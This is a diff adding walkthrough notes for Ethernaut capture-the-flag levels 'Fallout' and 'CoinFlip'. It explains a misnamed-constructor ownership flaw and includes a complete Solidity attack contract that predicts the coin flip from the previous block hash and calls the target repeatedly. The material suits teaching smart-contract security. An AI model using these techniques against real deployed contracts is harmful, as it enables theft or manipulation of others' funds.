@@ -28,3 +28,34 @@ Call 'await web3.eth.getBalance(instance)' to check that balance is 0.
 Click 'submit instance'.
 
 ## Lvl-2 Fallout
+For this level, you just have to call the 'Fallout()' function with 1 wei and the contract will be yours.
+The code comments say that Fallout() is the constructor but that's wrong. Since Solidity v0.4.23, constructors are now specified using the constructor keyword, and since the code is Solidity 0.6, the function Fallout() is not called during deployement and no owner is assigned to the contract.
+
+## Lvl-3 CoinFlip
+In order to beat this level, you need to write a smart contract in remix that does the same calcul then the targeted contract and send the guess to the target.
+Here is the code:
+`pragma solidity 0.6.0;
+
+import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/docs-v3.x/contracts/math/SafeMath.sol';
+
+interface CoinFlip {
+    function flip(bool) external;
+}
+
+contract Flipper {
+
+    using SafeMath for uint256;
+
+    CoinFlip target = CoinFlip(0xe364E0Cd32846CfbeBfBe21E84611e8467F0E1A4);
+
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    function attack() public returns(bool) {
+        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+
+        uint256 coinFlip = blockValue.div(FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+        target.flip(side);
+    }
+}`
+Then just call the 'attack()' function 10 times (wait some time between each calls to be sure you are not calling the function twice within one block).
